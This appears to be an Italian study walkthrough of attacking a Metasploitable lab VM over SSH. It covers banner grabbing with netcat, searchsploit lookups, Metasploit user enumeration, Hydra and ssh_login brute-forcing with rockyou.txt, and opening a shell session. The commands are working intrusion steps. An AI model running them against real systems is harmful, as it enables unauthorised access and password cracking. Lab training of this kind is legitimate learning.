# porta 22 TCP protocllo SSH (Secure shell)
questa porta utilizza il protocollo standard utilizzato dagli amministratori di sistema per connettersi da remoto a un server Linux e gestirlo tramite riga di comando. A differenza del vecchio protocollo Telnet o dell'FTP standard, tutto il traffico che passa attraverso SSH è completamente crittografato (comandi inseriti, password, file trasferiti)

sfruttiamo il comando nc (NetCat) che è un comando nativo di Linux piu veloce per analizzare la firma esatta del server su quella porta

- nc 192.168.56.102 22
  - nc comando per avviare netcat
  - 192.168.56.102 ip della macchina virtuale
  - 22 numero della porta interessata

Netcat apre una connessione TCP direttamente sulla porta 22 che abbiamo gia visto in precedenza essere aperta e riceveremo un risultato come questo:

┌──(kali㉿kali)-[~]
└─$ nc 192.168.56.102 22
SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1

dove è visibile il protocollo utilizzato "SSH-2.0" la versione "openSSH_4.7p1" e il sistema operativo i caratteri - _ vengono utilizzati per separare le parole che fanno parte dello stesso gruppo di stringa

ora effettuiamo la ricerca di esploit direttamente all'interno del database di kali linux senza fare ricerche online tramite il comando:

- searchsploit "OpenSSH 4.7p1"
  - searchsploit per effettuare la ricerca all'interno del database di kali linux
  - "OpenSSH 4.7p1" versione su cui vogliamo effettuare la ricerca di exploit disponibili

riceveremo pertanto un risultato simile a questo:

┌──(kali㉿kali)-[~]
└─$ searchsploit "OpenSSH 4.7p1"
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                          | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                            | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                  | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                    | linux/remote/45939.py
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                       
come possiamo notare ci sono 7 exploit disponibili diversi in linguaggio python (.py) e linguaggio C (.c) utilizzeremo il primo exploit per l'enumerazione degli utenti poiche viene sfruttata una vulnerabilità nota con la quale durante l'accesso in fase di login il sistema di autenticazione risponde in maniera specifica se è sbagliato il campo utente o se è sbagliato il campo password questo comporta che un attaccante anche inserendo un nome utente a caso potrebbe capire se quell'utente nel database esiste oppure no a seconda della risposta questo script utilizza proprio questa specifica funzionalità per vedere quali utenti sono reali e quali invece no.

ora senza usare il framework d'attacco utilizziamo un altro comando per trovare quello script in particolare e leggere il suo contenuto per capirne la struttura. Il comando che stiamo per lanciare creerà un nuovo script all'interno della cartella in cui ci troviamo pertanto possiamo creare una nuova cartella chiamata "prova_script" entrarci ed eseguire il comando li per averlo in una cartella specifica

- mkdir [nome_cartella] che sta per "make directory -> fai una cartella" per creare la nuova directory
- cd [nome_cartella] per spostarci dentro la cartella appena creata
- searchsploit -m linux/remote/45233.py
  - searchsploit il comando usato anche in precedenza per verificare gli exploit disponibili
  - -m è l'opzione che copia il file che indichiamo direttamente nella cartella in cui ci troviamo
  - linux/remote/45233.py è il percorso del file trovato in precedenza che vogliamo copiare

Ora abbiamo il file dello script eseguibile che possiamo leggere tranquillamente tramite il comando "less"
- less [nome_file]

per verificare quali parametri sono richiesti possiamo utilizzare invece il comando "--help"

Essendo comandi datati probabilmente saranno evidenziati errori di sintassi interni ma per ora procediamo invece con l'utilizzo del framework d'attacco metasploit integrato in kali linux

utilizzo del comando 
- msfconsole
  - apertura della console metasploit
- use auxiliary/scanner/ssh/ssh_enumusers
  - caricamento del modulo ufficiale di metasploit che sfrutta esattamente la stessa identica vulnerabilità del file python visto in precedenza ma senza errori di sintassi
- set RHOSTS 192.168.56.102 settiamo come bersaglio della scnasione per l'enumerazione degli utenti la macchina vulnerabile 

all'interno di kali linux ci sono dei file contenenti migliaia di nomi utenti comuni nel sistemi unix per far funzionare il programma dobbiamo dire a metasploit quale file prendere come riferimento per enumerazione dei nomi utente useremo in questo caso il file " USER_FILE " con il comando

- set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt

successivamente aver impostato questo file contenente una lista di nomi possiamo far partire l'attacco con il comando " run "

- run

Ora che conosciamo con certezza i nomi degli utenti reali dobbiamo verificare se uno di questi account utilizza una password debole, comune o identica al nome utente stesso Per farlo in modo ultra-specifico e performante, utilizzeremo Hydra, lo strumento standard di riferimento nel network auditing per il brute-force dei protocolli di rete concentrandoci sull'utente con nome " service " per fare questo utilizzere il file rockyou.txt gia presente in kali linux per farlo poiche il file è abbastanza grande ed è compresso dobbiamo scompattarlo il file è contenuto all'interno di usr/share/wordlists/rockyou.txt.gz quindi utilizzeremo il comando:

- sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

- hydra -l service -P /usr/share/wordlists/rockyou.txt 192.168.56.102 ssh -t 4 -V
  - hydra invoca il programma di login-cracker
  - -l service l'opzione " -l " indica ad hydra che vogliamo testare solo un utente specifico il secondo parametro è il nome dell'utente stesso " service "
  - -P /usr/share/wordlists/rockyou.txt
    - -P maiuscola indica il percorso assoluto del file dizionario delle password gia presente in kali linux dal nome rockyou.txt che contiente piu di 14 milioni di password reali ricavate da vecchi databreach storici
  - 192.168.56.102 l'ip del bersaglio
  - ssh Questo dice al software hydra di formattare i tentativi di accesso seguendo le regole e i pacchetti previsti dalla porta 22
  - -t 4 Imposta il numero di Task (thread) simultanei
  - -V Attiva la modalità Verbose Mostrerà sul tuo terminale, in tempo reale, ogni singola combinazione di password che Hydra sta testando
  
purtroppo il sistema di metaesploitable è un sistema datato e quindi richiede un esploit diverso che pero abbiamo gia in fornitura come visto in precedenza utilizziamo quindi il nuovo script

- use auxiliary/scanner/ssh/ssh_login

ora configuriamo di nuovo i parametri 

- set RHOSTS 192.168.56.102
- set USERNAME service
- set PASS_FILE /usr/share/wordlists/rockyou.txt
- set THREADS 4

lanciamo l'exploit 

- run

il software impiegherà parecchio tempo per trovare la combinazione giusta quindi per utilità creiamo noi un file .txt nella cartella in cui si trova rockyou cosi da settare il nuovo file molto piu corto contente solo 5 password tra cui deve esserci la password " service " cosi da vedere la riuscita del comando stesso ora abbiamo ottenuto un confronto pratico e reale sull'abbinamento tra un user "service" e la sua password "service" in piu quell'exploit in particolare una volta trovato l'abbinamento instaura delle connessione che possiamo verificare tramite il comando:

- sessions
  - mostrerà le connessioni che sono state attivate il risulta sarà simile a questo:

msf auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH kali @   192.168.56.101:37451 -> 192.168.56.102:22 (192.168.56.102)

adesso sappiamo quali sessioni sono state aperte e possiamo prendere il controllo della sessione con il comando :

- sessions -i 1
  - sessions è la base per la tipologa di comando da utilizzare
  - -i è l'opzione di interazione (interact)
  - 1 è l'id della della sessione stessa

la shell sarà una una linea di comando grezza perciò non mostrerà nulla ma la sarà comunque attiva e possiamo inviare comandi controlliamo se il login ha avuto successo e la versione del software in cui siamo

- whoami
  - mostrerà il nostro nome utente
- uname -a 
  - ci mostrerà informazioni sul server su cui siamo entrati
